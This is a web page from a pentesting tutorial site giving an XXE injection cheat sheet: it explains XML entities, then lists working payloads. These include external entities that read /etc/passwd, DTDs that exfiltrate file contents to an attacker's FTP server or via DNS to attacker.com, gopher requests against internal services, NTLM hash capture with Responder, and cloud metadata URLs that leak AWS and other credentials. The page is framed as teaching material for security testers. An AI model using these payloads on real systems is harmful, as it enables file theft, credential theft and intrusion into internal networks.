 <!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
<meta name="keywords" content="Security Idiots, Hacking Research Papers, Security Research Papers, Web application Penetration Testing, Web Pentesting, web Injection, SQL Injection, XSS, RFI, LFI, LDAP, XPATH, Bypass, RCE, XML Injection" />
<meta name="description" content="Just another article bring together the tips and tricks to find/exploit XXE and bypass it.">
<title>XXE Cheat Sheet - SecurityIdiots</title>
<link rel="stylesheet" href="../../css/skel.css" />
<link rel="stylesheet" href="../../css/style.css" />
<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
<script src="../../js/jquery.min.js"></script>
<script src="../../js/jquery.dropotron.min.js"></script>
<script src="../../js/skel.min.js"></script>
<script src="../../js/skel-layers.min.js"></script>
<script src="../../js/init.js"></script>
<script src="../../js/jquery.treeview.js" type="text/javascript"></script>
<script src="../../js/jquery.cookie.js" type="text/javascript"></script>
<script src="../../js/demo.js" type="text/javascript"></script>
<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
<div id="fb-root"></div>
<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=727224234003200&version=v2.0";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));

</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-54093058-1', 'auto');
  ga('send', 'pageview');

</script>
<script id="dsq-count-scr" src="https://securityidiots-com.disqus.com/count.js" async></script>
</head>
<body class="left-sidebar"> 
<div id="header">
<div class="container">

<h1><a href="XXE-Cheat-Sheet-by-SecurityIdiots.html#" id="logo">Security Idiots</a></h1>

<nav id="nav">
<ul>
<li><a href="../../index.html">Home</a></li>
<li>
<a href="XXE-Cheat-Sheet-by-SecurityIdiots.html">Categories</a>
<ul>
<li><a href="../Information-Gathering/index.html">Information Gathering</a>
<ul>
<li><a href="../Information-Gathering/Cloudflare-Bypass/index.html">Cloudflare Bypass</a></li>
</ul>
</li>
<li><a href="../SQL-Injection/index.html">SQL Injection</a>
<ul>
<li><a href="../SQL-Injection/MSSQL/index.html">MSSQL</a></li>
</ul>
</li>
<li><a href="../Tricks/index.html">Tricks</a></li>
<li><a href="../XSS/index.html">XSS</a></li>
<li><a href="../LFI/index.html">LFI</a></li>
<li><a href="../XPATH-Injection/index.html">XPATH Injection</a></li>
</ul>
</li>
<li><a href="https://www.youtube.com/watch?v=nMOyvIWn5Y8&list=PL5e1zp5ChO-S4nlMUy60AMIkB0XDgd8wb" target="_BLANK">Video Gallery</a></li>
<li><a href="../../construction.html">The Idiots Team</a></li>
<li><a href="../../construction.html">Contact Us</a></li>
</ul>
</nav>
</div>
</div>

<div id="main" class="wrapper style1">
<div class="container">
<div class="row"> 
<div id="sidebar" class="4u sidebar" style="width:25%;background:white;padding:20px;color:black; border: 2px solid #a1a1a1;border-radius: 25px;">
<section>
<header class="major">
<h2>Tutorials Browser</h2>
</header>
<div class="row half">
<ul id="browser" class="filetree">
<li><a href="../../Web-Pentest.html"><span class="folder">Web Pentest</span></a><ul id="Web-Pentest"></ul></li>
</ul>
<script>
function SetOpt(type,element,path,title,name){
container = document.getElementById(element);
if(type=='folder')
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span><ul id="'+path+'"></ul></li>';
else
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span></li>';
container.innerHTML = container.innerHTML + element;
}
SetOpt('folder','Web-Pentest','Web-Pentest/Information-Gathering','Information-Gathering','Information-Gathering');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html');
SetOpt('folder','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Cloudflare-Bypass','Cloudflare-Bypass');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html');
SetOpt('folder','Web-Pentest','Web-Pentest/LFI','LFI','LFI');
SetOpt('file','Web-Pentest/LFI','Web-Pentest/LFI/guide-to-lfi.html','guide-to-lfi.html','guide-to-lfi.html');
SetOpt('folder','Web-Pentest','Web-Pentest/SQL-Injection','SQL-Injection','SQL-Injection');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/sql-evil-twin-injection.html','sql-evil-twin-injection.html','sql-evil-twin-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Blind-SQL-Injection.html','Blind-SQL-Injection.html','Blind-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/delete-query-injection.html','delete-query-injection.html','delete-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/update-query-injection.html','update-query-injection.html','update-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/time-based-blind-injection.html','time-based-blind-injection.html','time-based-blind-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/insert-query-injection.html','insert-query-injection.html','insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html','database-type-testing-sql-injection.html','database-type-testing-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/routed_sql_injection.html','routed_sql_injection.html','routed_sql_injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/multi-query-injection.html','multi-query-injection.html','multi-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-insert-query-injection.html','mssql-insert-query-injection.html','mssql-insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html');
SetOpt('folder','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/MSSQL','MSSQL','MSSQL');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html','mssql-dios.html','mssql-dios.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html');
SetOpt('folder','Web-Pentest','Web-Pentest/Tricks','Tricks','Tricks');
SetOpt('file','Web-Pentest/Tricks','Web-Pentest/Tricks/Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html');
SetOpt('folder','Web-Pentest','Web-Pentest/WAF-Bypass','WAF-Bypass','WAF-Bypass');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XPATH-Injection','XPATH-Injection','XPATH-Injection');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-XPATH-injection.html','Basics-XPATH-injection.html','Basics-XPATH-injection.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/xpath-injection-part-1.html','xpath-injection-part-1.html','xpath-injection-part-1.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XSS','XSS','XSS');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss.series-by-securityidiots.html','xss.series-by-securityidiots.html','xss.series-by-securityidiots.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XXE','XXE','XXE');
SetOpt('file','Web-Pentest/XXE','Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html');

</script> </div>
</section>
</div>  <div id="content" class="8u skel-cell-important">
<section class="lol" style="padding:10px;background:#C9C9C2;color:black; border: 2px solid #a1a1a1;border-radius: 8px;">
<header class="major">
<h3><span class="byline">XXE Cheat Sheet - SecurityIdiots</span></h3>
<div class="row no-collapse-1">
<span class="post-description" style="text-align:justify;"><h3>XXE - XML External ENTITY Injection<br /> XML - Extenstible Markup language</h3>
XML is a well structured document which is used to store information and used as a dataset definition. In XML we can also define schema of the elements, use nested data elements, fetch out those details using an XML parser.
<br><br>
<strong>For example:</strong>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE users [
&lt;!ELEMENT users (user)+&gt;
&lt;!ELEMENT user (id,username,password)&gt;
&lt;!ELEMENT id (#PCDATA)&gt;
&lt;!ELEMENT username (#PCDATA)&gt;
&lt;!ELEMENT password (#PCDATA)&gt;
  ]&gt;
&lt;users&gt;
	&lt;user&gt;
		&lt;id&gt;1&lt;/id&gt;
		&lt;username&gt;Rahul&lt;/username&gt;
		&lt;password&gt;$%@#<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="94b5d4">[email&#160;protected]</a>%xzcv5354&lt;/password&gt;
	&lt;/user&gt;
	&lt;user&gt;
		&lt;id&gt;2&lt;/id&gt;
		&lt;username&gt;Faraz&lt;/username&gt;
		&lt;password&gt;<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="e78da78181">[email&#160;protected]</a>@0ck$l&lt;/password&gt;
	&lt;/user&gt;
	&lt;user&gt;
		&lt;id&gt;3&lt;/id&gt;
		&lt;username&gt;Armaan&lt;/username&gt;
		&lt;password&gt;armaan&lt;/password&gt;
	&lt;/user&gt;
&lt;/users&gt;</pre>
The above XML have a DTD defined where the data type for the XML is defined. The whole DTD can also be defined in an external file. There is something called "ENTITIES" in DTD which could be used for substituion of text.
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE users [
&lt;!ENTITY x "Faraz" &gt;
&lt;!-- Here "x" is the entity name which is nothing but the substituion for the string "Faraz" --&gt;
]&gt;
&lt;users&gt;
	&lt;user&gt;
		&lt;id&gt;2&lt;/id&gt;
		&lt;username&gt;&amp;x;&lt;/username&gt; &lt;!-- here the entity "x" is a variable storing the value "Faraz"--&gt;
		&lt;password&gt;$%@#<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="674627">[email&#160;protected]</a>%xzcvs546345354&lt;/password&gt;
	&lt;/user&gt;
&lt;/users&gt;</pre>
The ENTITIES could be used to define DTDs in an external file which could be a relative URL or an external URL. This is where XXE comes in. Having external DTD allows an attacker to make an external request from server side, which is done using the "SYSTEM" keyword followed by the path or the URL of external DTD file.
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE users [
&lt;!ENTITY x SYSTEM "http://securityidiots/evil.dtd" &gt;
]&gt;
&lt;users&gt;
	&lt;user&gt;
		&lt;id&gt;2&lt;/id&gt;
		&lt;username&gt;&amp;x;&lt;/username&gt; &lt;!-- here the entity "x" is calling our external entity--&gt;
		&lt;password&gt;$%@#<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="042544">[email&#160;protected]</a>%xzcvs546345354&lt;/password&gt;
	&lt;/user&gt;
&lt;/users&gt;
	</pre>
These Entities could only be substituted inside the XML structure. However, there is something called parameter entities which could be defined as well as called inside the DOCTYPE itself. They are denoted by "% " followed by entity name.
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
	&lt;!DOCTYPE users [
	&lt;!ENTITY % x SYSTEM "http://securityidiots/evil.dtd" &gt; %x; &lt;!-- The Entity "x" is called over here only --&gt;
	]&gt;
	&lt;users&gt;
		&lt;user&gt;
			&lt;id&gt;2&lt;/id&gt;
			&lt;username&gt;Faraz&lt;/username&gt;
			&lt;password&gt;$%@#<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="012041">[email&#160;protected]</a>%xzcvs546345354&lt;/password&gt;
		&lt;/user&gt;
	&lt;/users&gt;</pre>
<strong>Types of XXE Scenarios (Different types of scenarios that you may encounter)</strong><br><br>
<strong>Response based XXE</strong> - When the Injected request is giving data in response. <br>
<strong>Error Based XXE</strong> - When there is no response from the XML entities but we are able to view the response by triggering errors. <br>
<strong>Blind XXE</strong> - When there is no error nor response, but XML is getting parsed at server side. <br><br>
<strong>XXE Injection Sources - </strong>
File/Input sources that an attacker could use to inject his malicious XML.
<li>XML</li>
<li>PPT(X)</li>
<li>XLS(X)</li>
<li>PDF</li>
<li>ODT</li>
<li>DOC(X)</li>
<li>SSRF</li>
<li>GPX</li>
<li>SAML</li>
<li>SVG</li>
<li>JSON TO XML Modification</li>
<li>Feed.RSS</li>
<li>XSD (XML Schema Defination)</li>
<li>XMP</li>
<li>WAP</li>
<li>XSLT</li><br>
<h3>Exploitable Protocols</h3>
As, we can use http protocol to retreive our external DTD file, we may be able to use protocols other than HTTP depending on the XML Parser Library and the Server Side Language. Protocols which could help us further exploit the XXE Injection are:
<pre>File: could be used to read local file on the server
	file:///etc/passwd

<strong>HTTP(s)</strong>: useful in OOB Data Exfiltration
	http(s)://securityidiots.com/lol.xml

<strong>FTP</strong>: useful in OOB Data Exfiltration &amp; hitting the internal FTP service which is behind NAT
	ftp://securityidiots.com/lol.xml

<strong>SFTP</strong>: hitting the internal SFTP service which is behind NAT
	sftp://securityidiots.com:11111/

<strong>TFTP</strong>: hitting the internal TFTP service which is behind NAT
	tftp://securityidiots.com:12346/lol.xml

<strong>DICT</strong> : could also be used to make requests to internal services
	dict://ip:22/_XXX
	dict://ip:6379/_XXX

<strong>NETDOC</strong>: This could be used as an alternative to file in JAVA based Servers.
	netdoc:/etc/passwd

<strong>LDAP</strong>: could be used to query internal LDAP Service.
	ldap://localhost:11211/%0astats%0aquit

<strong>GOPHER</strong>:
	gopher://&lt;host&gt;:&lt;port&gt;/_&lt;gopher-path&gt;
	gopher://&lt;host&gt;:25/%0AHELO ... (executing commands on internal SMTP Service)

	Making internal HTTP Requests(GET,POST..etc):
	gopher://&lt;proxyserver&gt;:8080/_GET http://&lt;attacker:80&gt;/x HTTP/1.1%0A%0A
	gopher://&lt;proxyserver&gt;:8080/_POST%20http://&lt;attacker&gt;:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body

<strong>PHP</strong>: if PHP is installed we can use PHP Wrappers to read PHP source codes as Base64 content.
	php://filter/convert.base64-encode/resource=index.php

<strong>Data:</strong>
	data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk
	</pre>
<h3>Exploitation Methods:</h3>
Methods that you can use to increase the impact of your XXE and convert the SSRF to something useful.<br><br>
<pre>Stealing Net NTLM Hashes : file://attacker's remote IP Running Responder
	1. Run responder on Attacker's server which turns on the SMB Server.
	2. Use file://attackercontrolled.com/xyz.txt which inturn would try to authenticate using NET-NTLM Credentials with attacker's SMB Server ran by Responder and we get the Net-NTML Hashes which we could crack offline.

PORT Scanning
	1. Differentiate Open/Closed ports based on response content or response time.

Internal Network Mapping.
	1. Differentiate existing/nonexisting IPs based on response content or response time.

Metadata API :
Usually applications are hosted on cloud based services such as Google, Digital Ocean, Alibaba, Amazon etc. These cloud providers also provides API endpoints which can be used to interact with the configuration, information extraction using these endpoints. Here is a list of few providers and their Metadata API.

Google, Digital Ocean, Alibaba, Amazon, Kubernetes, Docker, Azure
Amazon :
	http://169.254.169.254/latest/meta-data/
	http://169.254.169.254/latest/meta-data/iam/security-credentials/{rolename} Leaks AWS Credentials which can give read/write access to buckets/EC2 instances leading to RCE
	http://169.254.169.254/latest/meta-data/hostname
	http://169.254.169.254/latest/user-data
Google :
	http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
	http://169.254.169.254/computeMetadata/v1/
	http://metadata.google.internal/computeMetadata/v1/
	http://metadata/computeMetadata/v1/
	http://metadata.google.internal/computeMetadata/v1/instance/hostname
	http://metadata.google.internal/computeMetadata/v1/instance/id
	http://metadata.google.internal/computeMetadata/v1/project/project-id
Digital Ocean :
	http://169.254.169.254/metadata/v1.json
	http://169.254.169.254/metadata/v1/
	http://169.254.169.254/metadata/v1/id
	http://169.254.169.254/metadata/v1/user-data
	http://169.254.169.254/metadata/v1/hostname
	http://169.254.169.254/metadata/v1/region
Alibaba :
	http://100.100.100.200/latest/meta-data/
	http://100.100.100.200/latest/meta-data/instance-id
	http://100.100.100.200/latest/meta-data/image-id
Kubernetes :
	https://kubernetes.default.svc.cluster.local
	https://kubernetes.default
Docker :
	http://127.0.0.1:2375/v1.24/containers/json
Azure :
	http://169.254.169.254/metadata/instance?api-version=2017-04-02
	http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text
Packetcloud:
	https://metadata.packet.net/userdata
OpenStack/RackSpace  :
	http://169.254.169.254/openstack</pre>
References:<br>
<a href="https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb">https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb</a><br>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery</a><br><br>
<h3>Out of Band Exploitation</h3>
Data extraction using DNS,FTP,HTTP etc.<br><br>
1. Over FTP:<br><br>
in Java 1.5+ you can't send data having non printable characters such as newlines,carriage returns etc. over HTTP. However, sending it over FTP is not an issue, an attacker can just setup a FTP server and listen for the incoming data.
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE users [
&lt;!ENTITY % x SYSTEM "http://securityidiots/evil.dtd" &gt; %x; %param1;
]&gt;
&lt;users&gt;
	&lt;user&gt;
		&lt;id&gt;2&lt;/id&gt;
		&lt;username&gt;&amp;exfil;&lt;/username&gt;
		&lt;password&gt;$%@#<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="4c6d0c">[email&#160;protected]</a>%xzcvs546345354&lt;/password&gt;
	&lt;/user&gt;
&lt;/users&gt;</pre>
External DTD to Host evil.dtd:
<pre>&lt;!ENTITY % data SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'ftp://AttackerIP:2222/%data;'&gt;"&gt;</pre>
Ref: <a href="https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/">https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/</a><br><br>
2. Over DNS:<br><br>
We may not be able to completely exfiltrate the files However, we can fetch partial contents.<br>
<font color="red">For this technique to work, you must be able to upload a file having your evil DTD contents, on the vulnerable server.</font><br><br>
Upload the file with following contents:
<pre>&lt;!ENTITY % data SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM '%data;.attacker.com'&gt;"&gt;</pre>
and in your XXE payload use the relative path to the uploaded DTD<br>
<pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE users [
&lt;!ENTITY % x SYSTEM "../../u/securityidiots/uploads/evil.dtd" &gt; %x; %param1;
]&gt;
&lt;users&gt;
	&lt;user&gt;
		&lt;id&gt;2&lt;/id&gt;
		&lt;username&gt;&amp;exfil;&lt;/username&gt;
		&lt;password&gt;$%@#<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="d4f594">[email&#160;protected]</a>%xzcvs546345354&lt;/password&gt;
	&lt;/user&gt;
&lt;/users&gt;</pre>
and in your DNS Server log all the wildcard DNS resolutions to read the input passed via out XXE Injection.<br><br>
<h3>OOB not allowed:</h3>
<pre>Content Spoofing on domain/subdomain:
	There may be cases where OOB HTTP is not allowed and you are able to find a way to save or control the contents on some page on the vulnerable application. One could write his evil DTD and use it with relative path to exploit the XXE over DNS.
File Upload on Domain/Subdomain:
	If OOB HTTP is not allowed and only a few whitelisted domains are allowed. In that case you can look for unrestricted file upload on the application or subdomains of the vulnerable application and host the DTD file there itself then we can exfiltrate data over DNS.

SSRF on Domain/Subdomain:
	If we manage to find a GET based full response SSRF over some whitelisted domains where we can control the whole content on the page. We can use it to exploit XXE over DNS.
Internal Local DTD includes:
	This is a very neat trick which can help to exploit XXE in worst cases using internal DTD files on the server.</pre>
Reference:<br>
<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a><br>
<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a><br><br>
Exploitable Services
<pre>Redis: Port 6379
		-https://maxchadwick.xyz/blog/ssrf-exploits-against-redis
		-https://dzmitry-savitski.github.io/2018/07/redis-ssrf-exploits-without-new-line

HashiCorp Consul: Port 8500
		-https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html

